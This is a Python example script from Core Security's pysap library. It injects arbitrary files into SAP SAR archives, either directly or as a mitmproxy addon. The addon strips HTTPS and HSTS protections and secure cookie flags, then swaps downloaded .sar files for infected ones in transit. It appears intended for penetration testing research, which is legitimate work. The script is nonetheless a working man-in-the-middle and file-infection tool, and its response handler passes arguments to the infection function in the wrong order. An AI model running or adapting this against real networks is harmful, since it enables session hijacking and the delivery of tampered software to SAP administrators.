#!/usr/bin/env python
# ===========
# pysap - Python library for crafting SAP's network protocols packets
#
# Copyright (C) 2012-2016 by Martin Gallo, Core Security
#
# The library was designed and developed by Martin Gallo from the Security
# Consulting Services team of Core Security.
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# ==============

# Standard imports
import re
import logging
from os.path import exists
from cStringIO import StringIO
# External imports
from optparse import OptionParser, OptionGroup
# Custom imports
import pysap
from pysap.SAPCAR import SAPCARArchive


def infect_sar_file(inject_files, sar_filename=None, sar_file=None):
    """ Receives a SAR file and infects it by adding new files

    :type inject_files: list of strings
    :param inject_files: list of files to inject into the SAR file

    :type sar_filename: string
    :param sar_filename: name of the SAR file to infect

    :type sar_file: string
    :param sar_file: content of the SAR file to infect

    :rtype: tuple of int, string
    :return: the new SAR file with the files injected
    """

    # Properly open the file provided as input
    if sar_filename:
        sar = SAPCARArchive(sar_filename, "r+")
    elif sar_file:
        sar_fd = StringIO(sar_file)
        sar = SAPCARArchive(sar_fd, "r+")
    else:
        raise Exception("Must provide a filename or a file content")

    # Add each of the files specified as inject files
    for filename, archive_filename in inject_files:
        sar.add_file(filename, archive_filename=archive_filename)

    # Writes the modified file
    sar.write()

    new_sar_file = sar.raw()
    return len(new_sar_file), new_sar_file


# Command line options parser
def parse_options(args=None, req_filename=True):

    description = "This example script can be used to infect a given SAR v2.00 or v2.01 file by means of adding new " \
                  "files to it. Files can take arbitrary names."

    epilog = "pysap %(version)s - %(url)s - %(repo)s" % {"version": pysap.__version__,
                                                         "url": pysap.__url__,
                                                         "repo": pysap.__repo__}

    usage = "Usage: %prog [options] -f <sar_filename> [<filename> <archive filename>]"

    parser = OptionParser(usage=usage, description=description, epilog=epilog)

    target = OptionGroup(parser, "Target options")
    target.add_option("-f", "--sar-filename", dest="sar_filename", help="Filename of the SAR file to infect")
    parser.add_option_group(target)

    misc = OptionGroup(parser, "Misc options")
    misc.add_option("-v", "--verbose", dest="verbose", action="store_true",
                    default=False, help="Verbose output [%default]")
    parser.add_option_group(misc)

    (options, args) = parser.parse_args(args)

    if req_filename and not options.sar_filename:
        parser.error("Must provide a file to infect!")

    if len(args) < 2 or len(args) % 2 != 0:
        parser.error("Invalid number or arguments!")

    inject_files = []
    while len(args) > 0:
        inject_files.append((args.pop(0), args.pop(0)))

    return options, inject_files


# Main function for when called from command-line
def main():
    options, inject_files = parse_options()

    if options.verbose:
        logging.basicConfig(level=logging.DEBUG)

    if not exists(options.sar_filename):
        print("[-] SAR file '%s' doesn't exist!" % options.sar_filename)
        return

    print("[*] Infecting SAR file '%s' with the following files:" % options.sar_filename)
    for (filename, archive_filename) in inject_files:
        if not exists(filename):
            print("[-] File to inject '%s' doesn't exist" % filename)
            return
        print("[*]\t%s\tas\t%s" % (filename, archive_filename))

    infect_sar_file(inject_files, sar_filename=options.sar_filename)


# Mitmproxy start event function
def start(context, argv):
    # set of SSL/TLS capable hosts
    context.secure_hosts = set()

    options, context.inject_files = parse_options(argv, req_filename=False)

    if options.verbose:
        logging.basicConfig(level=logging.DEBUG)


# Mitmproxy request event function
def request(context, flow):
    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)

    # Proxy connections to SSL-enabled hosts
    if flow.request.pretty_host in context.secure_hosts:
        flow.request.scheme = 'https'
        flow.request.port = 443


# Mitmproxy response event function
def response(context, flow):
    from six.moves import urllib
    from netlib.http import decoded

    with decoded(flow.response):
        # Remove HSTS headers
        flow.request.headers.pop('Strict-Transport-Security', None)
        flow.request.headers.pop('Public-Key-Pins', None)

        # Check if the file is a SAR file attachment
        if "content-disposition" in flow.response.headers:
            content_disposition = flow.response.headers.get("content-disposition").lower()
            if content_disposition.startswith("attachment") and content_disposition.endswith(".sar"):
                len, content = infect_sar_file(flow.response.content, context.inject_files)
                flow.response.headers["content-length"] = len
                flow.response.content = content
        else:
            # Strip links in response body
            flow.response.content = flow.response.content.replace('https://', 'http://')

        # Strip links in 'Location' header
        if flow.response.headers.get('Location','').startswith('https://'):
            location = flow.response.headers['Location']
            hostname = urllib.parse.urlparse(location).hostname
            if hostname:
                context.secure_hosts.add(hostname)
            flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

        # Strip secure flag from 'Set-Cookie' headers
        cookies = flow.response.headers.get_all('Set-Cookie')
        cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
        flow.response.headers.set_all('Set-Cookie', cookies)


if __name__ == "__main__":
    main()